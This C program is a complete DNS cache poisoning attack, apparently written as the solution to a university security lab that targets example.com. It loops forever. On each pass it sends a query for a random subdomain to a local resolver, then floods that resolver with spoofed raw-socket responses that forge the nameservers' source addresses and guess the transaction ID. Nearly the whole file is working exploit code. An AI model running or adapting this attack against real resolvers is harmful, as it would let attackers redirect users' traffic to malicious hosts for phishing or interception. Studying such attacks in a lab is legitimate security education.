#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#define MAX_FILE_SIZE 1000000

struct ipheader {
     unsigned char      iph_ihl:4, iph_ver:4; // IP header length, IP ver
     unsigned char      iph_tos; // Types of service
     unsigned short int iph_len; // IP packet length (data + header)
     unsigned short int iph_ident; // Identification
 //    unsigned char      iph_flag; // Fragmaentation flag
     unsigned short int iph_offset; // Flags offset
     unsigned char      iph_ttl;
     unsigned char      iph_protocol; // Protocol type
     unsigned short int iph_chksum; // IP datagram chksum
     unsigned int       iph_sourceip; // Source IP Adr
     unsigned int       iph_destip; // Dst IP Adr
    };

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(char *, char *, int, unsigned short);
void send_dns_response(char *, char *, int, unsigned short, int);

int main()
{
    long int lcount=1;
    srand(time(NULL));
    //Load the DNS request packet from file
    FILE *f_req=fopen("ip_req.bin", "rb");
    if(!f_req)
    {
        printf("%s", "Can't Open request file");
        exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    //Load the first DNS response packet from file
    FILE *f_resp = fopen("ip_resp.bin", "rb");
    if(!f_resp)
    {
        printf("%s", "Cant Open response file");
        exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

    char a[26]={'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
    while(1)
    {
        // Generate a random name with length 5
        char name[6]; name[5]='\0';
        for(int k=0; k<5; k++)
        {
            name[k]=a[rand()%26];
        }
        /* Step 1. Send a DNS request to the targeted local DNS server, This will trigger it to send out DNS queries */
        unsigned short id=rand()&0xffff;
        send_dns_request(name, ip_req, n_req, id);
        id=rand()&0xffff;
        for(int count=0;count < 50; count++)
        {
                printf("attempt # [%ld : %d] , request is [%s.example.com]\n", lcount,count+1, name);
                // Step 2. Send spoofed responses to the targeted local DNS
                id+=1;
                send_dns_response(name, ip_resp, n_resp, id, count);
        }
        lcount++;
    }
}

void send_dns_request(char *name, char *packet, int pkt_size, unsigned short id)
{
    memcpy(packet+41, name, 5);
    // unsigned short id=rand()&0xffff;
    id = htons(id);
    memcpy(packet+28, &id, 2);
    send_raw_packet(packet, pkt_size);
}

void send_dns_response(char *name, char *packet, int pkt_size, unsigned short id, int count)
{
    memcpy(packet+41, name, 5);
    memcpy(packet+64, name, 5);
    // unsigned short id = rand()&0xffff;
    id=htons(id);
    memcpy(packet+28, &id, 2);
    // if(count%2 == 0)
    // {
    //     unsigned int NSip = inet_addr("199.43.135.53");
    //     memcpy(packet+12, &NSip, 4);
    // }
    // else
    // {
    //     unsigned int NSip = inet_addr("199.43.133.53");
    //     memcpy(packet+12, &NSip, 4);
    // }
    unsigned int NSip = inet_addr("199.43.135.53");
    memcpy(packet+12, &NSip, 4);
    send_raw_packet(packet, pkt_size);
    NSip = inet_addr("199.43.133.53");
    memcpy(packet+12, &NSip, 4);
    send_raw_packet(packet, pkt_size);
}

// struct sockaddr_in {
//     short            sin_family;   // e.g. AF_INET
//     unsigned short   sin_port;     // e.g. htons(3490)
//     struct in_addr   sin_addr;     // see struct in_addr, below
//     char             sin_zero[8];  // zero this if you want to
// };
//
// struct in_addr {
//     unsigned long s_addr;  // load with inet_aton()
// };

void send_raw_packet(char *packet, int pkt_size)
{
    struct sockaddr_in dest_info;
    int enable=1;

    // Step 1: Create a raw network
    int sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    // IPPROTO_RAW socket is send only

    // Step 2: Set socket
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    // IPPROTO_IP socket options valid for datagram sockets are supported
    // A compiled BPF pseudo-code can be attached to a socket through set sockopt ()
    // IP_HDRINCL is specified and the IP header has a nonzero destination address
    // int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);

    // Step 3: Provide needed information about dest
    struct ipheader *ip = (struct ipheader *)packet;
    dest_info.sin_family=AF_INET;
    dest_info.sin_addr.s_addr=(unsigned long)ip->iph_destip;

    // Step 4: Send the packet
    sendto(sock, packet, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    // ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
    //                   const struct sockaddr *dest_addr, socklen_t addrlen);
    close(sock);
}
